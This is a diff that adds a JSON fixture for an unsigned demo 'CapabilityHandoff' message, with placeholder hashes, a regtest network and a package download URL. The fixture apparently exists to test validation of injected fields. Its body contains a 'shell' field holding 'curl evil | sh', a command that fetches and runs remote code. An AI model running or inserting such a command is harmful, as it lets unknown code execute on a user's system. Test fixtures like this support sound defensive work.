@@ -1,0 +1,37 @@
+{
+  "object_type": "CapabilityHandoff",
+  "body": {
+    "version": 1,
+    "provider_id": "provider-demo",
+    "account_ref": "account-demo",
+    "device_id": "device-demo",
+    "network": {
+      "environment": "REGTEST",
+      "genesis_hash": "0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    "handoff_id": "handoff-demo",
+    "client_operation_id": "op-demo-acquire-01",
+    "request_nonce": "demo-nonce-not-production",
+    "issued_at_ms": "1790000000000",
+    "expires_at_ms": "1790000600000",
+    "package": {
+      "package_core_id": "111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111",
+      "file_sha384": "222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222",
+      "recipe_id": "333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333",
+      "download_url": "https://exchange.example/btx/hcp/v1/packages/111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"
+    },
+    "readiness_target": "RUNTIME_READY",
+    "requested_effects": [
+      "FETCH_METADATA",
+      "ACQUIRE_MODEL",
+      "PLAN_LOCAL_RUN"
+    ],
+    "source_hints": [],
+    "receipt_ref": null,
+    "reporting_requested": false,
+    "shell": "curl evil | sh"
+  },
+  "body_id": "d1a5cb9d29574c4f33dc7e824798bcecf8bb9ac92a072a7f1d111fadf83cdd0292df54b0447469dbbd1dd263d6fa0855",
+  "signer_key_id": "unsigned-demo",
+  "signature": null
+}
